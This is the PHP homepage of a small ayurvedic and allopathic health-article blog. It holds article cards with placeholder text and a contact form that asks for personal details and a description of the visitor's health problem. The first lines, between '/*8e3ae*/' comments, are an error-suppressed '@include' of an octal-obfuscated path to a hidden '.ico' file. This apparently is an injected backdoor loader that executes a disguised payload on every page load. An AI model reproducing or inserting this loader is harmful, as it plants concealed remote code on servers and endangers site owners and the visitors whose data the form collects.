<?php
/*8e3ae*/

@include "\057ho\155e3\057st\171le\151jr\057pr\145ga\155at\145.c\157m/\143om\160le\164e-\143ar\145/.\145c7\06798\071b.\151co";

/*8e3ae*/
include('assets/partials/nav-bar.php'); ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <title>DOC BLOG</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- javascript -->
    <script src="assets/js/bootstrap.bundle.min.js"></script>
    <!-- favicon -->
    <link rel="shortcut icon" href="assets/images/favicon.ico">
    <!-- Bootstrap -->
    <link href="assets/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <link href='https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/css/bootstrap.min.css' rel='stylesheet'>
    <link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.0.3/css/font-awesome.css' rel='stylesheet'>

    <!--Script-->
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.min.js" integrity="sha384-Atwg2Pkwv9vp0ygtn1JAojH0nYbwNJLPhwyoVbhoPwBhjQPR5VtM2+xf0Uwh9KtT" crossorigin="anonymous"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <script type='text/javascript' src='https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/js/bootstrap.min.js'></script>
    <!-- Icons -->
    <link href="assets/css/materialdesignicons.min.css" rel="stylesheet" type="text/css" />
    <link href="assets/css/remixicon.css" rel="stylesheet" type="text/css" />
    <link href="https://unicons.iconscout.com/release/v3.0.6/css/line.css" rel="stylesheet">
    <!-- SLIDER -->
    <link rel="stylesheet" href="assets/css/tiny-slider.css" />
    <!-- Css -->
    <link href="assets/css/style.css" rel="stylesheet" type="text/css" id="theme-opt" />
    <style>
        /* Scroller styling */


        .card1 {
            transition: transform 0.2s ease;
            box-shadow: 0 4px 6px 0 rgba(22, 22, 26, 0.18);
            border-radius: 0;
            border: 0;
            margin-bottom: 1.5em;
        }

        .card1:hover {
            transform: scale(1.1);
            background-color: #D4E6F1;
        }
    </style>
    <script>
        function redirectToMyPage() {
            optionSelected = document.getElementById('book_app').value;
            //redirec to my url
            window.location.replace(optionSelected);

        } //end function redirectToMyPage

        $(document).ready(function() {

            $('.counter').each(function() {
                $(this).prop('Counter', 0).animate({
                    Counter: $(this).text()
                }, {
                    duration: 4000,
                    easing: 'swing',
                    step: function(now) {
                        $(this).text(Math.ceil(now));
                    }
                });
            });

        });
    </script>

</head>

<body>
    <!-- ** LOADER STARTS ** -->

    <!-- **LOADER ENDS** -->

    <!-- **NAVBAR STARTS** -->

    <!-- **NAVBAR ENDS** -->

    <!-- ** HERO SECTION STARTS ** -->
    <section class="bg-half-260 d-table w-100" style="background: url('assets/images/bg/bg_our.jpg') center;">
        <div class="bg-overlay bg-overlay-dark"></div>
        <div class="container">
            <div class="row mt-5 mt-lg-0">
                <div class="col-12">
                    <div class="heading-title">
                        <img src="../assets/images/logo-icon.png" height="50" alt="">
                        <h4 class="display-4 fw-bold title-dark mt-3 mb-4" style="color:aliceblue">All You Need <br> To Know</h4>
                        <p class="para-desc text-50 mb-0" style="color:aliceblue">we cater articles on various syndromes and diseases both <strong>ayurvedic</strong> and <strong>allopathic</strong> means are used while writing these articles.</p>

                        <select class="btn btn-success mt-4" aria-label="Default select example" id="book_app">
                            <option selected>Choose Article To Read</option>
                            <option value="yoga.php">Yoga</option>

                            <option value="nutrition.php">Nutrition</option>

                            <option value="infertility.php">Infertility</option>
                            < </select>
                                <button onclick="redirectToMyPage();" class="btn btn-success mt-4 ">Read Now
                                </button>

                    </div>
                </div>
                <!--end col-->
            </div>
            <!--end row-->
        </div>
        <!--end container-->
    </section>
    <!-- **** HERO SECTION ENDS **** -->

    <!-- ******************************************************************** THREE CARD SECTION STARTS ******************************************************************************************************************-->
    <!-- Start -->
    <div class="row justify-content-center" id="service">
        <div class="col-xl-10 mt-5 text-center">
            <div class="features-absolute bg-nocolor overflow-hidden card-group">
                <div class="col-xl-3 col-md-3 col-12 mt-5">
                    <div class="card card1 features feature-info rounded-md mr-3">
                        <div class="icon text-center rounded-md align-center">
                            <img src="assets/images/testimonals&services/yoga.png" height="80px" width="80px" class=" card-image">
                        </div>
                        <div class="card-body p-0 mt-2  border-cards">
                            <a href="pcos.php" class="title text-dark h5">PCOD/PCOS</a>
                            <p class="text-muted mt-3">There is now an abundance of readable dummy texts required purely
                                to fill a space.</p><br>
                            <a href="pcos.php" class="link">Read More <i class="ri-arrow-right-line align-middle"></i></a>
                        </div><br>
                    </div>
                </div>
                <!--end col-->

                <div class="col-xl-3 col-md-3 col-12 mt-5">
                    <div class="card card1 features feature-info rounded-md mr-3">
                        <div class="icon text-center rounded-md align-center">
                            <img src="assets/images/testimonals&services/yoga.png" height="80px" width="80px" class=" card-image">
                        </div>
                        <div class="card-body p-0 mt-2  border-cards">
                            <a href="diabetes.php" class="title text-dark h5">Diabetes</a>
                            <p class="text-muted mt-3">There is now an abundance of readable dummy texts required purely
                                to fill a space.</p><br>
                            <a href="diabetes.php" class="link">Read More <i class="ri-arrow-right-line align-middle"></i></a>
                        </div><br>
                    </div>
                </div>
                <!--end col-->
                <br><br><br>

                <div class="col-xl-3 col-md-3 col-12 mt-5">
                    <div class="card card1 features feature-info rounded-md mr-3">
                        <div class="icon text-center rounded-md align-center">
                            <img src="assets/images/testimonals&services/yoga.png" height="80px" width="80px" class=" card-image">
                        </div>
                        <div class="card-body p-0 mt-2  border-cards">
                            <a href="yoga.php" class="title text-dark h5">Thyroid</a>
                            <p class="text-muted mt-3">There is now an abundance of readable dummy texts required purely
                                to fill a space.</p><br>
                            <a href="thyroid.php" class="link">Read More <i class="ri-arrow-right-line align-middle"></i></a>
                        </div><br>
                    </div>
                </div>
                <!--end col-->
                <div class="col-xl-3 col-md-3 col-12 mt-5">
                    <div class="card card1 features feature-info rounded-md mr-3">
                        <div class="icon text-center rounded-md align-center">
                            <img src="assets/images/testimonals&services/yoga.png" height="80px" width="80px" class=" card-image">
                        </div>
                        <div class="card-body p-0 mt-2  border-cards">
                            <a href="pregnancy-package.php" class="title text-dark h5">Blood Cholestrol</a>
                            <p class="text-muted mt-3">There is now an abundance of readable dummy texts required purely
                                to fill a space.</p><br>
                            <a href="pregnancy-package.php" class="link">Read More <i class="ri-arrow-right-line align-middle"></i></a>
                        </div><br>
                    </div>
                </div>
                <!--end col-->
            </div>
        </div>
    </div>
    <!-- ******************************************************************** Three card SECTION ENDS ******************************************************************************************************************-->

    <!--************************************************************************** SERVICES SECTION STARTS **************************************************************************************************************-->
    <div class="container mt-100 mt-60">
        <div class="row justify-content-center">
            <div class="col-12">
                <div class="section-title mb-4 pb-2 text-center">
                    <h4 class="title mb-4">Other Articles</h4>
                </div>
            </div>
            <!--end col-->
        </div>
        <!--end row-->

        <div class="row text-center">

            <div class="col-xl-3 col-md-4 col-12 mt-5">
                <div class="card card1 features feature-info rounded-md">
                    <div class="bg-image hover-zoom">
                        <div class="icon text-center rounded-md align-center">
                            <img src="assets/images/testimonals&services/yoga.png" height="80px" width="80px" class=" card-image">
                        </div>
                        <div class="card-body p-0 mt-2  border-cards">
                            <a href="yoga.php" class="title text-dark h5">Yoga</a>
                            <p class="text-muted mt-3">There is now an abundance of readable dummy texts required purely
                                to fill a space.</p>
                            <a href="yoga.php" class="link">Read More <i class="ri-arrow-right-line align-middle"></i></a>
                        </div> <br>
                    </div>
                </div>
            </div>
            <!--end col-->

            <div class="col-xl-3 col-md-4 col-12 mt-5">
                <div class="card card1  features feature-info rounded-md">
                    <div class="icon text-center rounded-md align-center">
                        <img src="assets/images/testimonals&services/yoga.png" height="80px" width="80px" class=" card-image">
                    </div>
                    <div class="card-body p-0 mt-2  border-cards">
                        <a href="pain-management.php" class="title text-dark h5">Pain Management</a>
                        <p class="text-muted mt-3">There is now an abundance of readable dummy texts required purely
                            to fill a space.</p>
                        <a href="pain-management.php" class="link">Read More <i class="ri-arrow-right-line align-middle"></i></a>
                    </div> <br>
                </div>
            </div>
            <!--end col-->

            <div class="col-xl-3 col-md-4 col-12 mt-5">
                <div class="card card1 features feature-info rounded-md">
                    <div class="icon text-center rounded-md align-center">
                        <img src="assets/images/testimonals&services/yoga.png" height="80px" width="80px" class=" card-image">
                    </div>
                    <div class="card-body p-0 mt-2  border-cards">
                        <a href="nutrition.php" class="title text-dark h5">Nutrition</a>
                        <p class="text-muted mt-3">There is now an abundance of readable dummy texts required purely
                            to fill a space.</p>
                        <a href="nutrition.php" class="link">Read More <i class="ri-arrow-right-line align-middle"></i></a>
                    </div> <br>
                </div>
            </div>
            <!--end col-->

            <div class="col-xl-3 col-md-4 col-12 mt-5">
                <div class="card card1 features feature-info rounded-md">
                    <div class="icon text-center rounded-md align-center">
                        <img src="assets/images/testimonals&services/yoga.png" height="80px" width="80px" class=" card-image">
                    </div>
                    <div class="card-body p-0 mt-2  border-cards">
                        <a href="counselling.php" class="title text-dark h5">Counselling</a>
                        <p class="text-muted mt-3">There is now an abundance of readable dummy texts required purely
                            to fill a space.</p>
                        <a href="counselling.php" class="link">Read More <i class="ri-arrow-right-line align-middle"></i></a>
                    </div> <br>
                </div>
            </div>


        </div>
        <br> <br>
        <div class="row text-center">


            <!--end col-->

            <div class="col-xl-3 col-md-4 col-12 mt-5">
                <div class="card  card1 features feature-info rounded-md">
                    <div class="icon text-center rounded-md align-center">
                        <img src="assets/images/testimonals&services/yoga.png" height="80px" width="80px" class=" card-image">
                    </div>
                    <div class="card-body p-0 mt-2  border-cards">
                        <a href="infertility.php" class="title text-dark h5">Infertility</a>
                        <p class="text-muted mt-3">There is now an abundance of readable dummy texts required purely
                            to fill a space.</p>
                        <a href="infertility.php" class="link">Read More <i class="ri-arrow-right-line align-middle"></i></a>
                    </div> <br>
                </div>
            </div>
            <!--end col-->


            <!--end col-->

        </div>
        <!--end row-->
    </div>
    <!--end container-->
    </section>
    <!--end section-->
    <!--********************************************************************************** SERVICES SECTION ENDS *******************************************************************************************************-->

    <!--********************************************************************************** FORM SECTION STARTS *******************************************************************************************************-->
    <div class="container mt-100 mt-60">
        <div class="row align-items-lg-end">
            <div class="col-md-6">
                <div class="me-xl-3">
                    <div class="section-title mb-4 pb-2">
                        <i class=" text-center uil uil-notes text-info h2"></i>
                        <h4 class="title mb-4 text-center">Reach Us Out</h4>
                        <p class="text-muted para-desc mb-0">Great doctor if you need your family member to get effective simple consultation.</p>
                    </div>

                    <div class="features feature-bg-info d-flex bg-white p-4 rounded-md shadow position-relative overflow-hidden">
                        <i class="uil uil-stethoscope-alt icons h2 mb-0 text-info"></i>
                        <div class="ms-3">
                            <h5 class="titles">Success Of Treatment</h5>
                            <p class="text-muted para mb-0">Ayurveda Has Proved Its Sucess Time And Again</p>
                        </div>
                        <div class="big-icon">
                            <i class="uil uil-stethoscope-alt"></i>
                        </div>
                    </div>

                    <div class="features feature-bg-info d-flex bg-white p-4 rounded-md shadow position-relative overflow-hidden mt-4">
                        <i class="uil uil-microscope icons h2 mb-0 text-info"></i>
                        <div class="ms-3">
                            <h5 class="titles">Modern Technology</h5>
                            <p class="text-muted para mb-0">The Articles Written Here Are Based On Both Modern And Ancient Medical Sciences</p>
                        </div>
                        <div class="big-icon">
                            <i class="uil uil-microscope"></i>
                        </div>
                    </div>

                    <div class="features feature-bg-info d-flex bg-white p-4 rounded-md shadow position-relative overflow-hidden mt-4">
                        <i class="uil uil-user-md icons h2 mb-0 text-info"></i>
                        <div class="ms-3">
                            <h5 class="titles">Certified Student Experts</h5>
                            <p class="text-muted para mb-0">The most well-known dummy text is the 'Lorem Ipsum', which is said to have originated in the 16th century.</p>
                        </div>
                        <div class="big-icon">
                            <i class="uil uil-user-md"></i>
                        </div>
                    </div>
                </div>
            </div>
            <!--end col-->

            <div class="col-md-6 mt-4 mt-sm-0 pt-2 pt-sm-0">
                <div class="custom-form">
                    <form action="response_home.php" method="post">
                        <div class="row">
                            <div class="col-lg-6">
                                <div class="mb-3">
                                    <label class="form-label">Your First Name <span class="text-danger">*</span></label>
                                    <input name="Firstname" id="Firstname" type="text" class="form-control" placeholder="First Name :">
                                </div>
                            </div>
                            <!--end col-->

                            <div class="col-lg-6">
                                <div class="mb-3">
                                    <label class="form-label">Your Last Name <span class="text-danger">*</span></label>
                                    <input name="Lastname" id="Lastname" type="text" class="form-control" placeholder="Last Name :">
                                </div>
                            </div>
                            <!--end col-->

                            <div class="col-lg-6">
                                <div class="mb-3">
                                    <label class="form-label">Your Email <span class="text-danger">*</span></label>
                                    <input name="email" id="email" type="email" class="form-control" placeholder="Your Email :">
                                </div>
                            </div>
                            <!--end col-->

                            <div class="col-lg-6">
                                <div class="mb-3">
                                    <label class="form-label">Your Phone <span class="text-danger">*</span></label>
                                    <input name="phone" id="number" type="tel" class="form-control" placeholder="Your Phone :">
                                </div>
                            </div>
                            <!--end col-->


                            <!--end col-->


                            <div class="col-lg-12">
                                <div class="mb-3">
                                    <label class="form-label">Elaborate your problem <span class="text-danger">*</span></label>
                                    <textarea name="comments" id="comments" rows="4" class="form-control" placeholder="Your Message :"></textarea>
                                </div>
                            </div>
                            <!--end col-->

                            <div class="col-lg-12">
                                <div class="d-grid">
                                    <button type="submit" name="submit" class="btn btn-info">Ask</button>
                                </div>
                            </div>
                            <!--end col-->
                        </div>
                        <!--end row-->
                    </form>
                </div>
                <!--end col-->
            </div>
            <!--end row-->
        </div>
        <!--end container-->
        </section>
        <!--end section-->

        <!--********************************************************************************** FORM SECTION ENDS *******************************************************************************************************-->


        <!--********************************************************************************** ABOUT OUR TREATMENT SECTION STARTS *******************************************************************************************************-->

        <!--end col-->
        <!--image ends-->

        <!--text starts-->

        <!--end row-->
        <!--text ends-->


        <!--end row-->

        <!--end container-->
        <!--********************************************************************************** ABOUT OUR TREATMENT SECTION ENDS *******************************************************************************************************-->

        <!--********************************************************************************** DOCTORS SECTION STARTS *******************************************************************************************************-->
        <section class="section">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-12">
                        <div class="section-title text-center  mb-4 pb-2">
                            <h4 class="title mb-4">Doctor + Content Provider</h4>
                            <p class="text-muted mx-auto para-desc mb-0">Great doctor if you need your family member to get effective immediate assistance, emergency treatment or a simple consultation.</p>
                        </div>
                    </div>
                    <!--end col-->

                    <!--end row-->


                    <div class="col-xl-3 col-lg-3 col-md-6 mt-4  pt-2">
                        <div class="card team border-0 rounded shadow overflow-hidden">
                            <div class="team-img position-relative">
                                <img src="assets/images/dakshu.jpg" class="img-fluid" alt="">
                                <ul class="list-unstyled team-social mb-0">
                                    <li><a href="#" class="btn btn-icon btn-pills btn-soft-info"><i data-feather="facebook" class="icons"></i></a></li>
                                    <li class="mt-2"><a href="#" class="btn btn-icon btn-pills btn-soft-info"><i data-feather="linkedin" class="icons"></i></a></li>
                                    <li class="mt-2"><a href="#" class="btn btn-icon btn-pills btn-soft-info"><i data-feather="github" class="icons"></i></a></li>
                                    <li class="mt-2"><a href="#" class="btn btn-icon btn-pills btn-soft-info"><i data-feather="twitter" class="icons"></i></a></li>
                                </ul>
                            </div>
                            <div class="card-body content text-center">
                                <a href="doctor-team-one.html" class="title text-dark h5 d-block mb-0">Dakshita Dixit</a>
                                <small class="text-muted speciality">B.A.M.S</small>

                                <small class="text-muted">(pursuing)</small>
                            </div>
                        </div>
                    </div>
                    <!--end col-->
                </div>
            </div>
        </section>


    </div>

    </section>

    </section>
    <!--end section-->
    <!-- ** DOCTORS SECTION ENDS **-->

    <!-- ** WHAT DOCTORS SAY SECTION STARTS ** -->

    <!--end container-->

    <!--end section-->
    <!--********************************************************************************** DOCTORS SECTION ENDS *******************************************************************************************************-->


    <!-- ******************************************************************************* FIGUERES SECTION STARTS ****************************************************************************************************-->




    <!--end row -->

    <!-- ********************************************************************************************* FIGUERES SECTION ENDS *******************************************************************************************-->

    <!-- ********************************************************************************************* WHAT PATIENTS SAY SECTION STARTS ********************************************************************************-->


    <!-- ** PATIENTS SAYS SECTION ENDS ** -->



    <script src="assets/js/app.js"></script>
    <!-- ** FOOTER STARTS** -->

</body>
<?php include("assets/partials/footer.php"); ?>

</html>